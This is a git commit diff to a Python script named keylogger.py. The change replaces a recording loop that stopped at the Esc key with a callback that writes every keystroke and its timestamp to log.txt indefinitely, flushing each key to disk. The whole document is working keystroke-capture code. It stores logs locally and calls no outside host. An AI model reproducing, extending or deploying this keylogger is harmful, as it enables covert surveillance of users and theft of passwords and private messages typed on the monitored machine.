abff01c5a0291cc04b56406cc631b53f3a73ea45
Shaunak A. Natu <78775456+Shaunak-Natu@users.noreply.github.com>
2023-03-26 15:52:23 +0530

    Update

--- keylogger.py
+++ keylogger.py
@@ -1,19 +1,31 @@
-# using keyboard module to detect keypresses and time module for time logging.
 import keyboard as kb
 import time
 
 # keylog function records all the keystrokes along with the time at which they were recorded in a text file named log.
- 
 def keylog():
-    # remove the until parameter and the keylogger will run indefinitely. 
-    logger_obj = kb.record(until = 'Esc')
-    log_f = open("log.txt",'a')
+  # Open a file named log.txt in append mode to add new keystrokes to the end of the file
+  log_f = open("log.txt", 'a')
+  # Write a header to the log file to indicate the start of a new log session
+  log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")
 
-    log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")
+  # Define a callback function to handle keyboard events
+  def on_press(key):
+    # Get the current time in seconds since the epoch (January 1, 1970)
+    curr_time_since_epoch = time.time()
+    # Convert the current time in seconds since the epoch to a human-readable string
+    curr_time = time.ctime(curr_time_since_epoch)
+    # Write the current time and the key that was pressed to the log file
+    log_f.write(str(curr_time) + " : " + str(key) + "\n")
+    # Flush the log file to ensure that the keystroke is written to the file immediately
+    log_f.flush()
 
-    for data in logger_obj:
-        curr_time_since_epoch = time.time()
-        curr_time = time.ctime(curr_time_since_epoch)
-        log_f.write(str(curr_time) + " : "+ str(data) + "\n")
+  # Register the on_press function as a callback for keyboard events
+  kb.on_press(on_press)
+  # Wait for keyboard events to occur
+  kb.wait()
+  # Close the log file
+  log_f.close()
 
+# Call the keylog function to start logging keystrokes
 keylog()
+
